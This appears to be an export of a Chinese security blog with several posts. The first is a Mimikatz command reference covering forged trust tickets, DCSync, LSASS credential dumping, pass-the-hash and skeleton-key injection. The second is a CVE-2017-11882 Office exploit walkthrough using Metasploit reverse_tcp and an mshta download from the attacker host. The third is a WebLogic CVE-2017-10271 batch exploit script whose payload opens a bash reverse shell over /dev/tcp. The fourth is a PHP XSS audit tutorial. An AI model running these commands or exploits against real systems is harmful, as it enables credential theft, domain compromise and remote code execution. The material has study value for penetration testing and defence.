Directory信任密码哈希后（Mimikatz“privilege::debug”“lsadump::trust / patch”退出），可以生成信任票证。关于信任票的更多背景信息。 伪造内部AD森林信托票 在这个例子中，Trust门票利用Benjamin Delpy写的两个额外工具，叫做AskTGS和Kirbikator。 第1步：转储信任密码（信任密钥） 目前的Mimikatz版本可以提取信任密钥（密码）。* Mimikatz“privilege::debug”“lsadump::trust / patch”退出 步骤2：使用Mimikatz创建伪造的信任票证（inter-realm TGT） 伪造信托票，说明票务持有人是AD森林中的企业管理员（利用SIDHistory，“sids”，跨Mimikatz的信托，我对Mimikatz的“贡献”）。这样可以实现从子域到父域的完全管理访问。请注意，此帐户不必存在于任何地方，因为它实际上是信任的金票。 创建信托票的Mimikatz命令是“kerberos::golden” /domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。 /sid - 域的SID。在这个例子中：“S-1-5-21-3677078698-724690114-1972670770”。 / sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1581655573-3923512380-696647894-519”的Enterprise Admins组。Ť 他的参数将提供的小岛屿发展中国家的SID历史参数。 /user - 模拟用户名 / groups（可选） - 用户所属的组RID（第一个是主要组）默认值：513,512,520,518,519，用于众所周知的管理员组（如下所列）。 /ticket（可选） - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。 / ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。 /id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。 / startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。 / endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。 /renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。 / aes128 - AES128密钥 / aes256 - AES256密钥 Trust Ticket特定的必需参数： /target - 目标域的FQDN。 /service - 在目标域（krbtgt）中运行的kerberos服务。 /rc4 - 服务kerberos服务帐户（krbtgt）的NTLM哈希。 /ticket - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。 信任票默认组： 域用户SID：S-1-5-21 -513 域管理员SID：S-1-5-21 -512 架构管理员SID：S-1-5-21 -518 企业管理员SID：S-1-5-21 -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数） 组策略创建者所有者SID：S-1-5-21 -520 Mimikatz“Kerberos::golden /domain:child.lab.adsecurity.org / sid：S-1-5-21-3677078698-724690114-1972670770 **/ sids：S-1-5-21-1581655573-3923512380-696647894-519** / rc4：49ed1653275f78846ff06de1a02386fd / user：DarthVader / service：krbtgt /target:lab.adsecurity.org /ticket:c:\\temp\\tickets\\EA-ADSECLABCHILD.kirbi“exit 注意：使用/ sids参数将为目标AD域创建一个信任票证，表明持有者是企业管理员。 注意：Mimikatz生成带有硬编码域值的Silver Tickets，可能会出现在某些事件中。与有效的Kerberos身份验证相比，与伪造的故障单相关的登录/注销事件中的域字段也可能存在异常。 步骤3：使用在步骤2中创建的Trust Ticket文件获取目标域中目标服务的TGS。将TGS保存到文件中。 生成的TGS通过在此示例中针对CIFS服务提供对父（根）域的域控制器的EA访问（但它可以针对任何目标）。 Asktgs c：\\ temp \\ tickets \\ EA-ADSECLABCHILD.kirbi CIFS / ADSDC02.lab.adsecurity.org 步骤4：注入在步骤3中创建的TGS文件，然后使用欺骗权限访问目标服务。 Kirbikator lsa c：\\ temp \\ tickets \\ CIFS.ADSDC02.lab.adsecurity.org.kirbi KERBEROS::Hash - 密钥的哈希密码 KERBEROS::List -列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。与“klist”的功能类似。 / export - 导出文件的用户票证。 使用SEKURLSA::TICKETS为系统上所有经过身份验证的用户转储Kerberos票证。请注意，在某些情况下，用户证书将不会导出。这需要运行SEKURLSA::Tickets / export（具有适当的权限）。 KERBEROS::PTC - 传递缓存（NT6）* Nix系统，如Mac OS，Linux，BSD，Unix等缓存Kerberos凭据。可以使用Mimikatz复制和传递此缓存数据。对于在ccache文件中注入Kerberos票证也很有用。 Mimikatz的kerberos::ptc的一个很好的例子就是利用PyKEK开发MS14-068。PyKEK生成一个ccache文件，可以使用kerberos::ptc向Mimikatz注入。 KERBEROS::PTT - 传递票证找到Kerberos票证后，可以将其复制到另一个系统并传递到当前会话，有效地模拟登录，而无需与域控制器进行任何通信。无需特殊权利。 与SEKURLSA::PTH（Pass-The-Hash）相似。 / filename - 票证的文件名（可以是多个） / diretory - 一个目录路径，将注入所有.kirbi文件。 KERBEROS::Purge - 清除所有Kerberos票证类似于“klist purge”的功能。在传递票证（PTC，PTT等）之前运行此命令以确保使用正确的用户上下文。 KERBEROS::TGT - 为当前用户获取当前的TGT。 LSADUMPLSADUMP Mimikatz模块与Windows本地安全机构（LSA）交互以提取凭据。这些命令中的大多数都需要debug权限（privlege::debug）或本地系统。默认情况下，Administrators组具有“debug”权限。debug仍然必须通过运行“privilege::debug”来“激活”。 LSADUMP::Backupkeys需要管理员权限。 LSADUMP::Cache - 获取SysKey解密NL $ KM然后MSCache（v2）（来自注册表或配置单元）需要管理员权限。 LSADUMP::ChangeNTLM - 要求服务器为一个用户设置新密码/ ntlm。 LSADUMP::DCShadow - 将复制更改推送到域控制器。在 DCShadow.com上阅读更多内容。这需要完整的AD管理员权限或KRBTGT pw哈希。DCShadow临时将计算机设置为“DC”以进行复制： 在AD林配置分区中创建2个对象。 更新用于包含“GC”（全局编录）和“E3514235-4B06-11D1-AB04-00C04FC2DCD2”（AD复制）的计算机的SPN。有关ADSecurity SPN部分中的Kerberos服务主体名称的更多信息。 通过DrsReplicaAdd和KCC将更新推送到DC。 从配置分区中删除创建的对象。 配置分区中的临时DC对象 LSADUMP::DCSync - 要求DC同步对象（获取帐户的密码数据）需要域管理员，域管理员或自定义委派的成员身份。 2015年8月Mimkatz增加的一个主要功能是“DCSync”，它有效地“模仿”域控制器并从目标域控制器请求帐户密码数据。DCSync由Benjamin Delpy和Vincent Le Toux编写。从Mimikatz版本2.1 alpha 20160501开始，DCSync与重命名的域一起使用。 DCSync之前的漏洞利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz以获取KRBTGT密码哈希以创建黄金票证。借助Mimikatz的DCSync和相应的权限，攻击者可以通过网络从域控制器提取密码哈希以及以前的密码哈希，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。 运行DCSync需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都可以运行DCSync来提取密码数据。请注意，默认情况下，只允许只读域控制器为用户提取密码数据。 DCSync的工作原理： 在指定的域名中发现域控制器。 请求域控制器通过GetNCChanges复制用户凭据（利用目录复制服务（DRS）远程协议） 我之前已经为域控制器复制完成了一些数据包捕获，并确定了域控制器如何复制的DC内部通信流程。 Samba Wiki描述了DSGetNCChanges函数： “当第一个想要从第二个获取AD对象更新时，客户端DC向服务器发送DSGetNCChanges请求。响应包含客户端必须应用于其NC副本的一组更新。… 当DC收到DSReplicaSync请求时，对于它复制的每个DC（存储在RepsFrom数据结构中），它执行复制周期，其行为类似于客户端，并向该DC发出DSGetNCChanges请求。因此它从它复制的每个DC中获取最新的AD对象。“ DCSync选项： / all - DCSync为整个域提取数据。 / user - 要为其提取数据的用户的用户ID或SID。 / domain（可选） - Active Directory域的FQDN。Mimikatz将发现域中的DC以进行连接。如果未提供此参数，则Mimikatz默认为当前域。 / csv - 导出到csv / dc（可选） - 指定您希望DCSync连接到的域控制器并收集数据。 还有一个/ guid参数。 DCSync命令示例： 在rd.adsecurity.org域中提取 KRBTGT用户帐户的密码数据：Mimikatz“lsadump::dcsync /domain:rd.adsecurity.org / user：krbtgt”退出 在rd.adsecurity.org域中提取管理员用户帐户的密码数据：Mimikatz“lsadump::dcsync /domain:rd.adsecurity.org/user：Administrator”退出 在lab.adsecurity.org域中提取ADSDC03域控制器计算机帐户的密码数据：Mimikatz“lsadump::dcsync /domain:lab.adsecurity.org / user：adsdc03 $”退出 LSADUMP::LSA - 要求LSA Server检索SAM / AD企业（正常，动态补丁或注入）。使用/ patch作为数据子集，使用/ inject来处理所有事情。需要系统或debug权限。 / inject - 注入LSASS以提取凭据 / name - 目标用户帐户的帐户名称 / id - 目标用户帐户的RID / patch - 补丁LSASS。 通常，服务帐户是Domain Admins（或等效的）的成员，或者Domain Admin最近登录到计算机，攻击者从中转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希。 命令：mimikatz lsadump::lsa / inject exit 在域控制器上运行时，转储Active Directory域中的凭据数据。需要管理员访问权限（具有debug权限）或本地系统权限 RID 502帐户是KRBTGT帐户，RID 500帐户是域的默认管理员。 这是运行LSADUMP::lsa / patch时的结果，它只转储NTLM密码哈希值。 LSADUMP::NetSync NetSync提供了一种使用DC计算机帐户密码数据通过Silver Ticket模拟域控制器和DCSync目标帐户信息（包括密码数据）的简单方法。 LSADUMP::RpData LSADUMP::SAM - 获取SysKey来解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。需要系统或debug权限。它包含用户密码的NTLM，有时还包含LM哈希。它可以在两种模式下工作：在线（使用SYSTEM用户或令牌）或离线（使用SYSTEM＆SAM配置单元或备份）。 在针对在线SAM运行时，需要管理员访问权限（具有debug权限）或本地系统权限。 获取模拟的SYSTEM令牌：Mimikatz“PRIVILEGE::Debug”“TOKEN::elevate” LSADUMP::Secrets - 获取SysKey来解密SECRETS条目（来自注册表或配置单元）。需要系统或debug权限。 LSADUMP::SetNTLM - 要求服务器为一个用户设置一个新密码/ ntlm。 LSADUMP::Trust - 要求LSA Server检索Trust Auth信息（正常或动态补丁）。需要系统或debug权限。 从Active Directory中提取数据以获取域的现有信任关系。还显示信任密钥（密码）。 MISCMISC Mimikatz模块对于那些不太适合其他地方的命令来说是一种全能。这个模块中最着名的命令是MISC::AddSID，MISC::MemSSP和MISC::Skeleton。 MISC::AddSid - 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。需要系统或debug权限。 注意：ADDSID已移至2.1版本分支中的SID模块。 MISC::Cmd - 命令提示符（没有DisableCMD）。需要管理员权限。 MISC::Compressme - 将Mimikatz文件压缩到一个名为“mimikatz_x64.compressed”的新文件 MISC::Detours - （*实验*）尝试使用类似Detours的钩子枚举所有模块需要管理员权限。 MISC::MemSSP - 通过使用新SSP在内存中修补LSASS来注入恶意Windows SSP以记录本地经过身份验证的凭据 - 无需重新启动（重新启动会清除memssp Mimikatz注入）。这篇关于Mimikatz SSP的文章描述了内存中的修补以及更持久的SSP技术。需要管理员权限。MemSSP上的Mandiant演示文稿[ ](https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf)[![SneakyPersistence-EnableMimiSSP-MemSSP-01](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)](https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png)[ ](https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf) MISC::MFLT - 收集有关加载的驱动程序的详细信息，包括驾驶员高度。从Mimikatz v2.1.1开始（11/28/2017）。 MISC::Ncroutemon - Juniper Manager（不带DisableTaskMgr） MISC::Regedit - 注册表编辑器（不带DisableRegistryTools）需要管理员权限。 MISC::Skeleton - 在域控制器上将Skeleton Key注入LSASS进程。需要管理员权限。这使得对Skeleton Key修补DC的所有用户身份验证都可以使用“主密码”（也称为Skeleton Keys）以及通常的密码。 MISC::Taskmgr - 任务管理器（没有DisableTaskMgr）。需要管理员权限。 MISC::Wifi -不再在MISC中。可能转移到DPAPI：可能包含类似功能的Wifi。 MISC::WP MINESWEEPERMINESWEEPER::Infos - 在扫雷中提供地雷信息 NetNET ::alias NET ::group NET::ServerInfo NET::Session NET ::share NET ::stat NET::TOD NET ::user NET::WSession PRIVILEGEPRIVILEGE :: Backup - 获取备份权限/权限。需要debug权限。 PRIVILEGE::Debug - 获取debug权限（许多Mimikatz命令需要此权限或本地系统权限）。默认情况下，Administrators组具有“debug”权限。debug仍然必须通过运行“privilege::debug”来“激活”。 debug权限允许某人debug他们本来无法访问的进程。例如，作为用户运行的进程在其令牌上启用了debug权限，可以debug作为本地系统运行的服务。http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx 本杰明的备注：错误kuhl_m_privilege_simple; RtlAdjustPrivilege（20）c0000061意味着客户端不持有所需的权限（主要是您不是管理员：smirk :) PRIVILEGE::Driver - 获取驱动程序权限/权限。需要debug权限。 PRIVILEGE::ID - 按ID获取权限/权限。需要debug权限。 PRIVILEGE::Name - 按名称获取权限/权限。需要debug权限。 PRIVILEGE::Restore - 获取还原权限/权限。需要debug权限。 PRIVILEGE::Security - 获取安全权限/权限。需要debug权限。 PRIVILEGE::SysEnv - 获取管理系统环境的权限/权限。需要debug权限。 PRIVILEGE::TCB - 获取TCB权限/权限（可能作为操作系统权限的一部分）。需要提升权利（仍然是TBD）。 PROCESSMimikatz PROCESS模块提供了收集进程数据和与进程交互的能力。 PROCESS::Exports - 列出导出 PROCESS::Imports - 列出导入 PROCESS::List - 列出正在运行的进程需要管理员权限。 PROCESS::Resume - 恢复进程 PROCESS::Run - Run PROCESS::Start – 开始一个过程 PROCESS::Stop – - 终止进程 PROCESS::Suspend - 暂停进程 RPCRPC模块提供mimikatz的远程控制。 RPC::Close RPC::Connect RPC::Enum RPC::Server SEKURLSASEKURLSA Mimikatz模块与受保护的内存进行交互。该模块从lsass（本地安全机构子系统服务）的内存中提取密码，密钥，密码，票据。为了与LSASS进行交互，Mimikatz流程需要适当的权利： 管理员，通过“PRIVILEGE::Debug”获取debug权限 系统权利（“TOKEN::elevate”） 但是，对于转储的LSASS进程文件（即LSASS.dmp）运行时，不需要提升权限。 SEKURLSA::Backupkeys - 获取首选备份主密钥 SEKURLSA::Credman - 列出凭据管理器 SEKURLSA::Dpapi - 列出缓存的MasterKeys SEKURLSA::DpapiSystem - DPAPI_SYSTEM秘密 SEKURLSA::Ekeys - 列出Kerberos加密密钥 SEKURLSA::Kerberos - 列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据 SEKURLSA::Krbtgt - 获取Domain Kerberos服务帐户（KRBTGT）密码数据 SEKURLSA::LiveSSP - 列出LiveSSP凭据 SEKURLSA::LogonPasswords - 列出所有可用的提供者凭据。这通常显示最近登录的用户和计算机凭据。 在LSASS中转储当前登录（或最近登录）帐户的密码数据以及在用户凭据上下文中运行的服务。 帐户密码以可逆方式存储在内存中。如果它们在内存中（在Windows 8.1 / Windows Server 2012 R2之前），则会显示它们。在大多数情况下，Windows 8.1 / Windows Server 2012 R2不以这种方式存储帐户密码。KB2871997将此安全功能“后端”移植到Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012，但在应用KB2871997后计算机需要其他配置。 需要管理员访问权限（具有debug权限）或本地系统权限 Windows Server 2008 R2系统（显示密码）。 Windows Server 2012 R2系统 - 未显示明文密码 使用此命令也会转储使用帐户凭据运行的服务。请注意，只能以这种方式转储正在运行的服务（内存中的凭据）。 SEKURLSA::Minidump - 切换到LSASS minidump进程上下文 转储LSASS有几种不同的方法： procdump，PowerShell，任务管理器等。 请注意，需要使用从NT5 Win32或NT5x64或NT6 Win32或NT6 x64转储的相同平台来读取Minidump。 另一种选择是使用任务管理器转储LSASS进程 Sekurlsa::minidump可以打开转储文件。 SEKURLSA::MSV - 列出LM和NTLM凭证 SEKURLSA::Process - 切换到LSASS流程上下文 SEKURLSA::Pth - 传递哈希和过传哈希（又称传球）。 Mimikatz可以执行众所周知的操作’Pass-The-Hash’来使用用户密码的NTLM哈希而不是真实密码在另一个凭据下运行进程。为此，它启动具有假身份的进程，然后用真实信息（真实密码的NTLM哈希）替换虚假信息（伪密码的NTLM哈希）。 / user - 您要模拟的用户名，请记住，管理员不是此知名帐户的唯一名称。 / domain - 完全限定的域名 - 没有域或在本地用户/ admin的情况下，使用计算机或服务器名称，工作组或其他。 / rc4或/ ntlm - 可选 - 用户密码的RC4密钥/ NTLM哈希值。 / run - 可选 - 要运行的命令行 - 默认为：cmd有shell。 本杰明的备注： 此命令不适用于minidumps（废话）; 它需要提升的权限（privilege::debug或SYSTEM帐户），而不像使用一个官方API的“Pass-The-Ticket”;这个新版本的’Pass-The-Hash’用ntlm哈希替换Kerberos的RC4密钥（和/或替换AES密钥） - 它允许Kerberos提供者询问TGT门票！; 在XP / 2003 / Vista / 2008和7 / 2008r2 / 8/2012 kb2871997之前必须使用ntlm哈希（AES不可用或不可替换）; AES密钥只能在8.1 / 2012r2或7 / 2008r2 / 8/2012上用kb2871997替换，在这种情况下，您可以避免使用ntlm哈希。 本杰明在立交桥上的帖子。 SEKURLSA::SSP - 列出SSP凭据 SEKURLSA::Tickets - 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户下运行的服务。与kerberos::list不同，sekurlsa使用内存读取，不受关键出口限制。sekurlsa可以访问其他会话（用户）的门票。 / export - 可选 - 票证以.kirbi文件导出。它们以用户的LUID和组号开头（0 = TGS，1 =客户票（？）和2 = TGT） 与LSASS的凭证转储类似，使用sekurlsa模块，攻击者可以在系统内存中获取所有Kerberos票证数据，包括属于管理员或服务的数据。如果攻击者破坏了为用户使用后端SQL服务器访问的Kerberos委派配置的Web服务器，则此功能非常有用。这使攻击者能够捕获并重用该服务器上内存中的所有用户票证。 “kerberos::tickets”mimikatz命令转储当前登录用户的Kerberos票证，不需要提升权限。利用sekurlsa模块从受保护内存（LSASS）读取的功能，可以转储系统上的所有Kerberos票证。 命令： mimikatz sekurlsa ::门票退出 转储系统上所有经过身份验证的Kerberos票证。 需要管理员访问权限（带有debug权限）或本地系统权限 以下屏幕截图显示了另一个域管理员用户（LukeSkywalker）的转储密码和Kerberos票证（TGS和TGT）。 以下屏幕截图显示了另一个管理员（HanSolo）的转储凭据和Kerberos票证（TGS和TGT）。 以下屏幕截图显示了SQL服务帐户（svc-SQLDBEngine01）的转储凭据和Kerberos票证（TGS和TGT）。 SEKURLSA::Trust - 获取信任密钥（我认为这是不赞成使用lsadump::trust / patch） SEKURLSA::TSPKG - 列出TsPkg证书 SEKURLSA::Wdigest - 列出WDigest凭据 服务SERVICE::+ （加号） - 安装Mimikatz服务（’mimikatzsvc’） SERVICE::- (minus sign) - 卸载Mimikatz服务（’mimikatzsvc’） SERVICE::List - 列出服务 SERVICE::Me SERVICE::Preshutdown - preshutdown服务 SERVICE::Remove 删除服务 SERVICE::Resume - 恢复服务 SERVICE::Shutdown - 关闭服务 SERVICE::Start - 启动服务 SERVICE::Stop - 停止服务 SERVICE::Suspend - 暂停服务 SIDMimikatz SID模块取代了MISC::AddSID。使用SID::Patch修补ntds服务。 SID::add - 将SID添加到对象的SIDHistory SID::clear - 清除对象的SIDHistory SID::lookup - 名称（/ name）或SID（/ sid）查找 SID::modify - 修改对象的对象SID SID::patch - 补丁NTDS服务 SID::query - 按SID或名称查询对象 STANDARDSTANDARD::Answer–- 回答生命，宇宙和万物的终极问题。 STANDARD::Base64 - 将输出切换到base64输出 STANDARD::CD - 更改或显示当前目录 STANDARD::CLS - 清除屏幕 STANDARD::Coffee - 显示咖啡的ASCII图像! STANDARD::Exit–退出Mimikatz STANDARD::Hostname - 显示系统本地主机 STANDARD::LocalTime - 显示系统本地日期和时间（OJ命令） STANDARD::Log - 将Mimikatz数据发送到日志文件 STANDARD::MarkRus - 传递哈希信息。在Mimikatz 2.1.1中删除 STANDARD::Sleep - 睡眠时间为毫秒 STANDARD::Version - 显示版本信息 SYSENVMimikatz SYSENV模块提供管理系统环境变量的功能。 SYSENV ::列出SYSENV ::获取SYSENV ::设置SYSENV::Del TOKENMimikatz Token模块使Mimikatz能够与Windows身份验证令牌进行交互，包括抓取和模拟现有令牌。 TOKEN::Elevate - 模拟令牌。用于将权限提升为SYSTEM（默认）或使用Windows API在框中查找域管理员令牌。需要管理员权限。 在框中找到域管理员凭据并使用该令牌：token::elevate / domainadmin TOKEN::List - 列出系统的所有令牌 TOKEN::Revert - 恢复为进程令牌 TOKEN::Run - Run TOKEN::Whoami - 显示当前身份 TSTS::MultiRDP - （实验性）补丁终端服务器服务允许多个用户 TS::Sessions - 列出TS / RDP会话。 TS ::远程 VAULTVAULT::List - 列出保险库凭证 VAULT::Cred - cred","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://shackles.top/tags/内网渗透/"}]},{"title":"Office远程代码执行漏洞（CVE-2017-11882）","slug":"Office远程代码执行漏洞（CVE-2017-11882）","date":"2017-12-01T09:52:08.000Z","updated":"2019-02-19T03:32:11.351Z","comments":true,"path":"2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/","link":"","permalink":"https://shackles.top/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/","excerpt":"","text":"Office远程代码执行漏洞（CVE-2017-11882）漏洞原理&emsp;&emsp;2017年11月14日微软公司披露潜伏达17年之久的office远程代码执行漏洞（CVE-2017-11882）。CVE-2017-11882允许攻击者在当前用户的上下文中运行任意代码，导致无法正确处理内存中的对象，即为“ Microsoft Office Memory Corruption Vulnerability “，栈溢出的远程执行漏洞。 ​ 该漏洞是在EQNEDT32.EXE组件的缓冲区溢出导致。当受害用户打开Office文档时就有可能被漏洞利用，危害极大。 原因是由于EQNEDT32.EXE进程读入包含MathType的ole数据。函数给Font Name数据分配的大小是0x24个字节，超过大小会造成栈缓冲区溢出。而程序在拷贝公式Font Name数据时没有对其长度进行校验，从而导致漏洞发生。 通杀以下没有更新的Office版本： Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016 MicrosoftOffice 365 具体漏洞分析内容详见以下链接：https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882 https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/ https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455 https://www.anquanke.com/post/id/87311 漏洞复现第一步 漏洞验证&emsp;&emsp;登录kali攻击机，进入用户home文件中的CVE-2017-1182-payload目录。 执行以下命令生成payload-cale.doc文件，为漏洞payload（漏洞利用程序），弹出计算机程序验证漏洞是否存在。1python CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o payload-cale.doc 接下来要把payload-cale.doc文件上传到windows靶机，受害者打开doc文件，漏洞执行利用。 登录windows靶机，打开FTP服务器。直接payload-cale.doc文件上传到此靶机上，真实环境下可利用社会工程学。 打开FTP服务器。 在kali攻击机登录ftp。输入账号密码。 12ftp 192.168.0.40 [靶机IP地址]college college@root 上传到靶机上，上传目录是桌面。 1put payload-cale.doc 成功上传到靶机桌面上。 点击payload-cale.doc文件可看到执行计算机弹窗效果，实验验证成功，说明靶机存在此漏洞。 第二步 漏洞利用在kali攻击机上启动msf 。 1msfconsole 查找CVE-2017-11882 漏洞(攻击机已经集成攻击程序) 1search CVE-2017-11882 1use exploit/windows/smb/CVE-2017-11882 设置payload为反弹tcp 1set payload windows/meterpreter/reverse_tcp 查看所需选项 1show options 设置本机地址 1set lhost 192.168.0.23 [kali操作机地址] 设置uri的路径1set URIPATH payload 运行payload,启动利用后，msf会监听本机8080端口，靶机访问192.168.0.23:8080/payload.doc，打开doc触发就会得到反弹到4444端口的tcp会话中 1exploit -j 在/home/college/CVE-2017-11882-payload目录下中执行以下命令：生成 payload.doc 1python CVE-2017-11882.py -c &quot;mshta http://192.168.0.11[kali操作机地址]:8080 /payload&quot; -o payload.doc 同样通过ftp上传到桌面上，再点击执行 payload.doc 。 123ftp 192.168.0.40 [靶机IP地址]college college@rootput payload.doc 第三步 后渗透阶段可以看到成功反弹shell，session 1 进入meterpreter终端中。 1session 1 查看系统信息，如下。进一步可以使用meterpreter进行后渗透攻击。 1sysinfo","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"Weblogic 反序列化漏洞（CVE-2017-10271）","slug":"weblogin反序列漏洞（CVE-2017-10271)","date":"2017-11-05T15:53:56.000Z","updated":"2019-02-19T03:32:11.079Z","comments":true,"path":"2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/","link":"","permalink":"https://shackles.top/2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/","excerpt":"","text":"Weblogic 反序列化漏洞（CVE-2017-10271）Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 参考链接： https://www.exploit-db.com/exploits/43458/ https://paper.seebug.org/487/ https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html 环境搭建 nc 监听 21端口 python3 批量利用脚本 123456789101112131415161718192021222324252627282930313233343536import requestsheaders = &#123;\"Content-Type\": \"text/xml\"&#125;def exp(url): data = ''' &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.102/21 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; ''' respond = requests.post(url=url, data=data, headers=headers) if(respond.status_code == 500): print('success')if __name__ == '__main__': url = \"http://192.168.1.101:7001/wls-wsat/CoordinatorPortType\" exp(url)","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://shackles.top/tags/漏洞/"}]},{"title":"PHP 代码审计_知识点","slug":"PHP 代码审计_知识点","date":"2017-10-20T15:53:56.000Z","updated":"2018-11-20T06:50:11.055Z","comments":true,"path":"2017/10/20/PHP 代码审计_知识点/","link":"","permalink":"https://shackles.top/2017/10/20/PHP 代码审计_知识点/","excerpt":"","text":"PHP 代码审计_知识点1.XSS1.1反射型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。 0x02漏洞代码及分析 漏洞代码： 1234&lt;?phpusername = _GET['user'];echo \"用户名：\".$username;?&gt; 将用户输入的user内容直接输出到页面，未经过任何过滤。可导致XSS漏洞攻击 payload 1?user=&lt;script&gt;alart(1)&lt;/script&gt; - 修复建议：在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤 建议修复代码： 1234567&lt;?phpusername = _GET['user'];echo \"用户名：\".htmlspecialchars($username);?&gt; 1.2存储型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。存储型跨站：危害大、恶意代码存储服务器(数据库) 0x02漏洞代码及分析 漏洞代码： 123456789101112131415if (!empty($_POST['content'])) &#123; $content = addslashes($_POST['content']); if ($mysqli - &gt;query(\"insert into test (content)values('$content')\")) &#123; echo '发言成功'; &#125; else &#123; echo '发言失败'; &#125;&#125;$data = $mysqli - &gt;query(\"select content from test\");if ($data - &gt;num_rows !== '0') &#123; $arr = $data - &gt;fetch_all(); foreach($arr as $a) &#123; echo '发言：'.$a[0].'&lt;br&gt;'; &#125;&#125; 用户发言的内容未进行字符串编码，直接存储到数据库中，并取出数据库中带有恶意代码的内容输出到网页中，导致XSS攻击 修复建议： 在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤 建议修复代码：echo ‘发言：’.htmlspecialchars($a[0]).’‘; 1.3 DOM XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。DOMXSS：一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。 0x02漏洞代码及分析漏洞代码1： 123456789101112131415&lt; ?phpimg = isset(GET['img']) ? htmlspecialchars($GET['img']) : 'default.jpg';? &gt;&lt;img src = \"\"id = \"image\" &gt;&lt;script &gt;var test = document.getElementById('image');test.src = '&lt;?php echo $img;?&gt;';&lt; /script&gt;/ 